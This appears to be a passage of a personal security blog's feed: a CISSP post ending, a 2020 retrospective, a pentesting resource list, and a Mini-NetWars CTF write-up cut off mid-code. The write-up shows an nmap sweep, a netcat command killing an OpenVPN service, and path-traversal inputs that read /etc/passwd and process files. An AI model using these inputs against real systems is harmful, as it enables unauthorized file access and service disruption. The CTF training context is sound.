-&lt;strong&gt;I will NOT break the NDA or any code of ethics. Do not ask me for specifics.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Ian Marrero</name></author><category term="Certifications" /><category term="Personal" /><category term="cissp" /><category term="certifications" /><category term="cybersecurity" /><category term="personal" /><summary type="html">I passed the CISSP exam in April 2021! Such a difficult exam! The exam is nothing like the practice tests you can find available for free or for purchase. Throughout the exam, I felt unprepared; halfway through the exam I felt like I was failing, that I should take mind-notes for my next attempt. To my surprised, I passed at 100 questions at around 110 minutes into the exam. This is how I did it…</summary></entry><entry><title type="html">2020 in Retrospection</title><link href="https://ianmf.com/2021/01/2020-in-retrospection/" rel="alternate" type="text/html" title="2020 in Retrospection" /><published>2021-01-04T21:01:09-05:00</published><updated>2021-01-04T21:01:09-05:00</updated><id>https://ianmf.com/2021/01/2020-in-retrospection</id><content type="html" xml:base="https://ianmf.com/2021/01/2020-in-retrospection/">&lt;h2 id=&quot;i-took-some-training&quot;&gt;I took some training&lt;/h2&gt;
-
-&lt;p&gt;Having recently switched job and the mandate of Working from Home (WFH), I had a lot of time in my hands. I decided to take advantage of the situation by taking training as needed. My current employer provides all its employee Udemy for Business account. We can take any course available in Udemy at no-cost to us. It has been a tool of immense value because it provides mastery level training in many areas of IT that I may not be too familiar with. These are the best training I took this year from Udemy.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;CISSP Certification Training by Thor Pedersen&lt;br /&gt;
-  Thor divides the training in 4 courses: Domain 1-2, Domain 3-4, Domain 5-6, and Domain 7-8. He does an excellent job discussing all the concepts and putting additional emphasis on important ones.&lt;/li&gt;
-  &lt;li&gt;Linux Privilege Escalation for OSCP &amp;amp; Beyond! by Tib3rius &lt;br /&gt;
-  This course came heavily recommended by many professionals in the infosec/offensive security community. Tib3rius goes over many techniques for obtaining admin/root access on systems, which is my weakest area when doing HackTheBox or other similar challenges.&lt;/li&gt;
-  &lt;li&gt;Windows Privilege Escalation for OSCP &amp;amp; Beyond! by Tib3rius &lt;br /&gt;
-  Same as above.&lt;/li&gt;
-  &lt;li&gt;Writing With Confidence: Writing Beginner To Writing Pro by Clare Lynch&lt;br /&gt;
-  The best none IT related course I took this year. Clare provides great insights into business writing. During the lessons, I was able to identify mistakes and bad habits I commit often that prevents me from getting my point across to the audience. The final chapters are targeted towards professional writers, I skipped most of them.&lt;/li&gt;
-  &lt;li&gt;Certified Kubernetes Administrator (CKA) with Practice Tests by Mumshad Mannambeth&lt;br /&gt;
-  Recommended by a coworker. I had to become proficient using Kubernetes in a matter of weeks. This training was able to provide me with everything I needed: the basics concepts to how it works internally. I was able to work my way through most tasks by referring back to the video.&lt;/li&gt;
-  &lt;li&gt;Linux Administration Bootcamp: Go from Beginner to Advanced by Jason Cannon&lt;br /&gt;
-  I was planning to take RHCSA certification test when I decided to enroll in this course. I was already proficient with Linux before taking this course, I took the course as a refresher to RHEL 8 and its new features. Overall, Jason Cannon did an excellent job at explaining the concepts in a way that anyone could follow along.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;i-made-some-life-changes&quot;&gt;I made some life changes&lt;/h2&gt;
-
-&lt;p&gt;By end of 2019, I realized that I needed to switch jobs to further grow professionally. It was not easy leaving behind the amazing colleagues, the exciting work, and the great work-life balance at US Cyber Command.&lt;/p&gt;
-
-&lt;p&gt;During the initial phases of pandemic, I was offered a position with great opportunities of advancements at Forcepoint. I accepted the position amidst the uncertainty of the economy and job security. So far, it is paying off. Within one year, my manager was able to offer me a new opportunity within the company at a closer location to home with better responsibilities. So far so good! Thanks, Rich!&lt;/p&gt;
-
-&lt;h2 id=&quot;2021-to-do-list&quot;&gt;2021 To-do list&lt;/h2&gt;
-
-&lt;p&gt;This year I would like to earn my first bounty from HackerOne. I have always played with the idea of getting into Offensive Security. My plan is to do more runs on HackTheBox and complete Burp Suite training.&lt;/p&gt;
-
-&lt;p&gt;And since my company will subsidize certifications that are work-related, I will be going for RHCSA and RHCE. Let’s see how it goes!&lt;/p&gt;
-
-&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Ian Marrero</name></author><category term="Personal" /><category term="personal" /><summary type="html">I took some training</summary></entry><entry><title type="html">Pentesting Resources and Links</title><link href="https://ianmf.com/2020/10/pentesting-resources-and-links/" rel="alternate" type="text/html" title="Pentesting Resources and Links" /><published>2020-10-27T20:47:39-05:00</published><updated>2020-10-27T20:47:39-05:00</updated><id>https://ianmf.com/2020/10/pentesting-resources-and-links</id><content type="html" xml:base="https://ianmf.com/2020/10/pentesting-resources-and-links/">&lt;p&gt;Collections of links I have found useful during pentesting, CTFs, or red teaming exercise.&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Name&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Description&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;URL&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;NetSec - How and where to start preparing for OSCP&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Describes how to prepare for OSCP.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://netosec.com/start-preparing-for-oscp/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;How To Pass the OSCP – a Beginner Friendly Guide&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Another How-To prepare for OSCP.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://kentosec.com/2019/10/09/how-to-pass-the-oscp-a-beginner-friendly-guide/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;tech.bitvijays.com - The Magic of Learning&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;A guide on how to go from novice to pentester.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://tech.bitvijays.com/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Offensive Security’s PWK syllabus&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;The official Offensive Security PWK syllabus.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://www.offensive-security.com/documentation/penetration-testing-with-kali.pdf&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;OSCP Exam Guide&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Official guide for the OSCP exam.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://www.offensive-security.com/pwk-online/PWK-Exam-Guide.pdf&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;OSCP Reviews&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Compilation of reviews from those who took the OSCP.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://jhalon.github.io/becoming-a-pentester/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;TJ_Null’s OSCP Preparation Guide&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;A comprehensive guide and list of resources for OSCP preparation.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://www.netsecfocus.com/oscp/2019/03/29/OSCP-Prep.html&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;HTB - Hack The Box&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;An online platform to test and advance your skills in penetration testing and cyber security.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://www.hackthebox.eu/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;VulnHub&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Provides materials allowing anyone to gain practical hands-on experience with digital security, computer applications and network administration tasks.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://www.vulnhub.com/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;TryHackMe&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Another online platform for learning and teaching cyber security, all through your browser.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://tryhackme.com/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;PortSwigger Web Security Academy&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Free online training for the next generation of cybersecurity professionals.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://portswigger.net/web-security&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;OverTheWire&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;A site to learn and practice security concepts in the form of fun-filled games.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://overthewire.org/wargames/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;PentesterLab&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Provides a set of vulnerable systems that can be used to learn about penetration testing and web security.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://pentesterlab.com/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Cyber Mentor’s Practical Ethical Hacking course&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;A practical course on ethical hacking.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://www.udemy.com/course/practical-ethical-hacking/&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;IppSec’s YouTube channel&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Detailed walkthroughs of how to tackle various hacking challenges.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Avi7611 / Oscp-Cheat-Sheet&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;OSCP Cheat Sheet&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://github.com/avi7611/Oscp-Cheat-Sheet/tree/master/oscp&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;ffuf/ffuf&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Fast web fuzzer written in Go&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://github.com/ffuf/ffuf&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Tib3rius / AutoRecon&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;AutoRecon is a multi-threaded network reconnaissance tool which performs automated enumeration of services.&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://github.com/Tib3rius/AutoRecon&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;xChockax/Buffer-Overflow&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Buffer Overflow Cheat sheet&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://github.com/xChockax/Buffer-Overflow/blob/master/Buffer%20Overflow%20Cheatsheet.pdf&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Awesome Burp Extensions&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;A curated list of amazingly awesome Burp Extensions&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;https://github.com/snoopysecurity/awesome-burp-extensions&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;</content><author><name>Ian Marrero</name></author><category term="Cybersecurity" /><category term="ctf" /><category term="oscp" /><category term="pentesting" /><category term="redteam" /><category term="resources" /><summary type="html">Collections of links I have found useful during pentesting, CTFs, or red teaming exercise.</summary></entry><entry><title type="html">Mini-NetWars – Mission 3 (May 2020)</title><link href="https://ianmf.com/2020/05/mini-netwars-mission-3-may-2020/" rel="alternate" type="text/html" title="Mini-NetWars – Mission 3 (May 2020)" /><published>2020-05-20T10:19:45-05:00</published><updated>2020-05-20T10:19:45-05:00</updated><id>https://ianmf.com/2020/05/mini-netwars-mission-3-may-2020</id><content type="html" xml:base="https://ianmf.com/2020/05/mini-netwars-mission-3-may-2020/">&lt;p class=&quot;notice--info&quot;&gt;I forgot to take notes and someone shared their’s with me. I stopped  at “Find the name of the debug PCAP on the web server”&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/2020/05/external-content.duckduckgo-150x150.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h1 id=&quot;snaaake&quot;&gt;Snaaake&lt;/h1&gt;
-
-&lt;h2 id=&quot;what-two-large-words-appear-first-when-you-exit-the-game-eg-elf-terminal&quot;&gt;What two, large words appear first when you exit the game? e.g. Elf Terminal&lt;/h2&gt;
-
-&lt;p&gt;Quit the game through the UI and then:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;______             _____                       _
-|  _  \           /  __ \                     | |
-| | | |_____   __ | /  \/ ___  _ __  ___  ___ | | ___
-| | | / _ \ \ / / | |    / _ \| &apos;_ \/ __|/ _ \| |/ _ \
-| |/ /  __/\ V /  | \__/\ (_) | | | \__ \ (_) | |  __/
-|___/ \___| \_/    \____/\___/|_| |_|___/\___/|_|\___|
-
-NOTE: Disable in production, port 3000
-
-Tools:
-
-* netcat
-* openvpn
-* nmap
-
-Your IP is 192.168.64.2
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;what-high-numbered-port-is-open-on-another-host-in-the-same-24-network-eg-5000&quot;&gt;What high-numbered port is open on another host in the same /24 network? e.g. 5000&lt;/h2&gt;
-
-&lt;p&gt;3000&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@52aadb50d975:~$ nmap -p- -sC -sV 192.168.64.0/24
-Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-14 18:44 UTC
-Nmap scan report for 192.168.64.1
-Host is up (0.00037s latency).
-
-PORT     STATE SERVICE
-3000/tcp open  ppp
-
-Nmap scan report for 52aadb50d975 (192.168.64.2)
-Host is up (0.00024s latency).
-
-PORT     STATE  SERVICE
-3000/tcp closed ppp
-
-Nmap scan report for 960a1eb2-66db-49ea-9940-d1e5ed6dcdec-1.d4fd3562-d3fe-43ac-9d10-a91e46c3d8c2 (192.168.64.3)
-Host is up (0.00021s latency).
-
-PORT     STATE SERVICE
-3000/tcp open  ppp
-
-Nmap done: 256 IP addresses (3 hosts up) scanned in 2.85 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;what-flag-is-shown-when-you-disable-something-outside-the-snaaake-game&quot;&gt;What flag is shown when you disable something outside the Snaaake game?&lt;/h2&gt;
-
-&lt;p&gt;NetWars{ShutItDown}&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elf@52aadb50d975:~$ netcat 192.168.64.3 3000
-&amp;gt;INFO:OpenVPN Management Interface Version 1 -- type &apos;help&apos; for more info
-help
-Management Interface for OpenVPN 2.4.8 x86_64-alpine-linux-musl [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [MH/PKTINFO] [AEAD] built on Feb  7 2020
-Commands:
-auth-retry t           : Auth failure retry mode (none,interact,nointeract).
-bytecount n            : Show bytes in/out, update every n secs (0=off).
-echo [on|off] [N|all]  : Like log, but only show messages in echo buffer.
-exit|quit              : Close management session.
-forget-passwords       : Forget passwords entered so far.
-help                   : Print this message.
-hold [on|off|release]  : Set/show hold flag to on/off state, or
-                         release current hold and start tunnel.
-kill cn                : Kill the client instance(s) having common name cn.
-kill IP:port           : Kill the client instance connecting from IP:port.
-load-stats             : Show global server load stats.
-log [on|off] [N|all]   : Turn on/off realtime log display
-                         + show last N lines or &apos;all&apos; for entire history.
-mute [n]               : Set log mute level to n, or show level if n is absent.
-needok type action     : Enter confirmation for NEED-OK request of &apos;type&apos;,
-                         where action = &apos;ok&apos; or &apos;cancel&apos;.
-needstr type action    : Enter confirmation for NEED-STR request of &apos;type&apos;,
-                         where action is reply string.
-net                    : (Windows only) Show network info and routing table.
-password type p        : Enter password p for a queried OpenVPN password.
-remote type [host port] : Override remote directive, type=ACCEPT|MOD|SKIP.
-proxy type [host port flags] : Enter dynamic proxy server info.
-pid                    : Show process ID of the current OpenVPN process.
-client-auth CID KID    : Authenticate client-id/key-id CID/KID (MULTILINE)
-client-auth-nt CID KID : Authenticate client-id/key-id CID/KID
-client-deny CID KID R [CR] : Deny auth client-id/key-id CID/KID with log reason
-                             text R and optional client reason text CR
-client-kill CID [M]    : Kill client instance CID with message M (def=RESTART)
-env-filter [level]     : Set env-var filter level
-client-pf CID          : Define packet filter for client CID (MULTILINE)
-rsa-sig                : Enter an RSA signature in response to &amp;gt;RSA_SIGN challenge
-                         Enter signature base64 on subsequent lines followed by END
-certificate            : Enter a client certificate in response to &amp;gt;NEED-CERT challenge
-                         Enter certificate base64 on subsequent lines followed by END
-signal s               : Send signal s to daemon,
-                         s = SIGHUP|SIGTERM|SIGUSR1|SIGUSR2.
-state [on|off] [N|all] : Like log, but show state history.
-status [n]             : Show current daemon status info using format #n.
-test n                 : Produce n lines of output for testing/debugging.
-username type u        : Enter username u for a queried OpenVPN username.
-verb [n]               : Set log verbosity level to n, or show if n is absent.
-version                : Show current version number.
-END
-signal SIGTERM
-SUCCESS: signal SIGTERM thrown
-elf@52aadb50d975:~$
-
-     __     _   __    __                 ____ _           _    _____ _      ___                  __
-  /\ \ \___| |_/ / /\ \ \__ _ _ __ ___  / / _\ |__  _   _| |_  \_   \ |_   /   \_____      ___ __\ \
- /  \/ / _ \ __\ \/  \/ / _` | &apos;__/ __|| |\ \| &apos;_ \| | | | __|  / /\/ __| / /\ / _ \ \ /\ / / &apos;_ \| |
-/ /\  /  __/ |_ \  /\  / (_| | |  \__ &amp;lt; &amp;lt; _\ \ | | | |_| | |_/\/ /_ | |_ / /_// (_) \ V  V /| | | |&amp;gt; &amp;gt;
-\_\ \/ \___|\__| \/  \/ \__,_|_|  |___/| |\__/_| |_|\__,_|\__\____/  \__/___,&apos; \___/ \_/\_/ |_| |_| |
-                                        \_\                                                      /_/
-
-NetWars{ShutItDown}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;same&quot;&gt;SAME&lt;/h1&gt;
-
-&lt;h2 id=&quot;if-you-type-in-a-bad-difficulty-level-what-is-the-error-type-that-occurs-eg-sparkletoohigherror&quot;&gt;If you type in a bad difficulty level, what is the error type that occurs? (e.g. SparkleTooHighError)&lt;/h2&gt;
-
-&lt;p&gt;FileNotFoundError&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;What difficulty level would you like? Options: easy, medium, hard -&amp;gt; super hard
-Oops, something went wrong reading the configuration file: FileNotFoundError
-[Errno 2] No such file or directory: &apos;/home/same/super hard&apos;
-
-Press ctrl-c to exit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;if-you-load-an-invalid-file-using-a-path-traversal-what-type-of-file-is-it-expecting-eg-yaml&quot;&gt;If you load an invalid file using a path traversal, what type of file is it expecting? (e.g. YAML)&lt;/h2&gt;
-
-&lt;p&gt;JSON&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─zoey@nomadic ~/netwars
-╰─$ nc same.elfu.org 8080
-What difficulty level would you like? Options: easy, medium, hard -&amp;gt; ../../etc/passwd
-Failed to parse JSON configuration file: &amp;lt;class &apos;json.decoder.JSONDecodeError&apos;&amp;gt;
-Expecting value: line 1 column 1 (char 0)
-
--- START DEBUG INFORMATION --
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-same:x:1000:1000:,,,:/home/same:/bin/bash
-Debian-exim:x:101:101::/var/spool/exim4:/usr/sbin/nologin
-
--- END DEBUG INFORMATION --
-
-Press ctrl-c to exit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;can-you-find-the-full-path-to-the-python-script-eg-pathtofilepy&quot;&gt;Can you find the full path to the Python script? (e.g. /path/to/file.py)&lt;/h2&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/same/same.py&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;what-is-the-flag-at-the-top-of-the-python-script-eg-netwarsiheartchristmas-&quot;&gt;What is the flag at the top of the Python script? (e.g. NetWars{IHeartChristmas} )&lt;/h2&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetWars{you_found_me}&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;╭─zoey@nomadic /proc/self/cwd
-╰─$ nc same.elfu.org 8080
-What difficulty level would you like? Options: easy, medium, hard -&amp;gt; ../../proc/self/cmdline
-Failed to parse JSON configuration file: &amp;lt;class &apos;json.decoder.JSONDecodeError&apos;&amp;gt;
-Expecting value: line 1 column 1 (char 0)
-
--- START DEBUG INFORMATION --
-python3/home/same/same.py
--- END DEBUG INFORMATION --
-
-Press ctrl-c to exit
-╭─zoey@nomadic /proc/self/cwd
-╰─$ nc same.elfu.org 8080
-What difficulty level would you like? Options: easy, medium, hard -&amp;gt; ../../home/same/same.py
-Failed to parse JSON configuration file: &amp;lt;class &apos;json.decoder.JSONDecodeError&apos;&amp;gt;
-Expecting value: line 1 column 1 (char 0)
-
--- START DEBUG INFORMATION --
-#!/usr/bin/env python3
-
-# Flag: NetWars{you_found_me}
-
-import json
-import random
-import os
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h1 id=&quot;snowball-fight&quot;&gt;Snowball Fight&lt;/h1&gt;
-
-&lt;h2 id=&quot;win-a-game-of-snowball-fight-and-submit-the-flag-eg-netwarsbooya-&quot;&gt;Win a game of Snowball Fight and submit the flag. (e.g. NetWars{BooYa} )&lt;/h2&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetWars{YouSankMyBattlefort}&lt;/code&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;win-a-game-of-snowball-fight-on-impossible-and-submit-the-flag&quot;&gt;Win a game of Snowball Fight on Impossible and submit the flag.&lt;/h2&gt;
-
-&lt;p&gt;You can use chrome to override &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;battlefort.js&lt;/code&gt; and look at the websocket network history in dev tools. Change the following source code and it should print out the&lt;br /&gt;
-forts on the board:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ws.onmessage = function (event) {
-  // console.log(&quot;Incoming ws: &quot; + event.data);
-  var messageIn = JSON.parse(event.data);
-  messageIn.Verify =
-    &quot;gLtBovwCiHRjhMyop4ixz4ZrY7OtPjIcFJH4z5/++jfdgLV3uWHeQrpH6G/6D8vevy7bDFQLrHTCFNEfid6TMaxLLfjubszh4YWz5gErH4UlpVMC5CtMKqocvB33/Ofuy9JW98syEJ8DlHxjWHIfgnFib+tSbB6Mn3lS2aJs3ecS7X9DcdRBIz5PiuVv8XFLsYxYawNN2/IlSpez3TQq9pitBnfK2OftKy9aQvRVaElxYm/rUmwejJ95UtmibN3nzUhgVN+wSzmAGlhhbU1oobGMWGsDTdvyJUqXs900KvatvHia9fQXrL6BZ2J55TShNmf+fu4R02nzzbTKtgFXI0CS8HrrvB6esG/Uvl8IjY7ECriW/24zy4HqV2SZ5VJz7wh8tgE66H1JGiXbhzVDmxfpDBThRiYLTanqPJxw0Rws3nBVCoE40KiHRjiKOOivKmoUgl+BFH114fWj77UeVQXBywXdmWNPGVMJWeL2KqmX/K3sHDWzMkWORecGv5NIdtTot0OsFopJD4u/3YhSVKvAxr7ydRI/+kDPPD8957yiqXhFtZJU1L+TfFZQDyLvzeMV9WpktxeIwpTdgbyaioVxIZ3SlBKPhx4FSXtepu9TS858j2MkGY+2p1FWc6dCtDLvS+20sYhygmIUG/TQN9ynBU/lNdQGkNKxPp5nX5Cx/91Hb3qtWtvuOUqtkb2v24wI31q87S8WKaoWy93l5tBKjkfv6njkUCPpqPWYmpdb0tWU2D7KbirHuU5h8VzvrmIRDvgv8jnf+WbsajMcvdW0z/QVH9UoOxE8TvajTkbjqaJD7AnI8I7x4++jDFtqhQTvi09iGjTvS8JMHSvDAz/pLd1j6VHfaGGpyy5VI6lIhhilpqOKcFQBGNzfIj153A9370YX9rSTrM8UhRVyafrd1WjoSz8hO3P+Nd2uJEzdhps6dVQeA0FkUcNoJphNES0Ztlx7H1m1fkSRlDRR9Z3YmIapTTBo6eNsVCFWPLbfE3VTXArv2lpN7CpY/YMCyYtSZtjcFSz3AFQsMPFHr2Y5JcM3G4Ewfw8MRlzjGNLcD3fvRhf2tJOszxSFFXJp3YC1d7lh3kK6R+hv+g/L3rbTlTGyoCuyVQpaljvMl1okejtWRmico9wuLYDp7UrGhtvhE6sbmaEm4w59ltMnHUjY4tWdmqcMTS6fx5PzOWIlCWbOnd1qVf26HdnHJyADFgg2N7OjlShcv92EEVYdVfc6YZ54r5Lkt51w7nIyQUWWI1FxYy8eXcpEYURvHqIFojRyV9E6IeLn720WCSjcHoanGqGdpHnYWAGDSDs9T/YgLJiUNHMyhGCL9L+ImIiwWvRejDJIRdIwK9h27OHioSsXoGKat2ELWTootQhmUUg=&quot;;
-
-  if (messageIn.Type == &quot;SALUTE&quot;) {
-    document.getElementById(&quot;statusVerify&quot;).value = messageIn.Verify;
-    for (y = 0; y &amp;lt; messageIn.Status[&quot;FriendlyLayout&quot;].length; y++) {
-      for (x = 0; x &amp;lt; messageIn.Status[&quot;FriendlyLayout&quot;][y].length; x++) {
-        if (messageIn.Status[&quot;FriendlyLayout&quot;][y][x] == 1) {
-          document.getElementById(&quot;1,&quot; + x + &quot;,&quot; + y).classList.add(&quot;fort&quot;);
-        }
-      }
-    }
-    document.getElementById(&quot;statusVerify&quot;).value = messageIn.Verify;
-    for (y = 0; y &amp;lt; messageIn.Status[&quot;EnemyLayout&quot;].length; y++) {
-      for (x = 0; x &amp;lt; messageIn.Status[&quot;EnemyLayout&quot;][y].length; x++) {
-        if (messageIn.Status[&quot;EnemyLayout&quot;][y][x] == 1) {
